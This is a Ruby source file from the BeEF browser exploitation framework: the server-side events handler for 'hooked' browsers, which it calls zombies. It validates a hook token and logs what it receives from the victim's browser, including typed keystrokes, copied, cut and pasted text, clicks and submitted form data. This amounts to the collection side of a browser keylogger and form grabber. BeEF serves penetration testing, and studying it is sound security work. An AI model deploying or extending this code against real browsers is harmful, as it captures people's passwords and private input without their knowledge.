#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Extension
module Events
    
  #
  # The http handler that manages the Events.
  #
  class Handler

    Z = BeEF::Core::Models::HookedBrowser

    def initialize(data)
      @data = data
      setup()
    end

    #
    # Sets up event logging
    #
    def setup()
      
      # validates the hook token
      beef_hook = @data['beefhook'] || nil 
      if beef_hook.nil?
        print_error "[EVENTS] beef_hook is null"
        return
      end

      # validates that a hooked browser with the beef_hook token exists in the db
      zombie = Z.first(:session => beef_hook) || nil
      if zombie.nil?
        print_error "[EVENTS] Invalid beef hook id: the hooked browser cannot be found in the database"
        return
      end
     
      events = @data['results']

      # push events to logger
        logger = BeEF::Core::Logger.instance
        events.each do |key,value|
            logger.register('Event', parse(value), zombie.id)
        end
    end

    def parse(event)
      case event['type']
        when 'click'
          result = event['time'].to_s+'s - [Mouse Click] x: '+event['x'].to_s+' y:'+event['y'].to_s+' > '+event['target'].to_s
        when 'focus'
          result = event['time'].to_s+'s - [Focus] Browser has regained focus.'
        when 'copy'
          result = event['time'].to_s+'s - [User Copied Text] "'+event['data'].to_s+'"'
        when 'cut'
          result = event['time'].to_s+'s - [User Cut Text] "'+event['data'].to_s+'"'
        when 'paste'
          result = event['time'].to_s+'s - [User Pasted Text] "'+event['data'].to_s+'"'
        when 'blur'
          result = event['time'].to_s+'s - [Blur] Browser has lost focus.'
        when 'keys'
          result = event['time'].to_s+'s - [User Typed] "'+event['data'].to_s+'" > '+event['target'].to_s
        when 'submit'
          result = event['time'].to_s+'s - [Form Submitted] '+event['data'].to_s+' > '+event['target'].to_s
        else
          print_debug '[EVENTS] Event handler has received an unknown event'
          result = 'Unknown event'
      end
      result
    end
    
  end
  
end
end
end
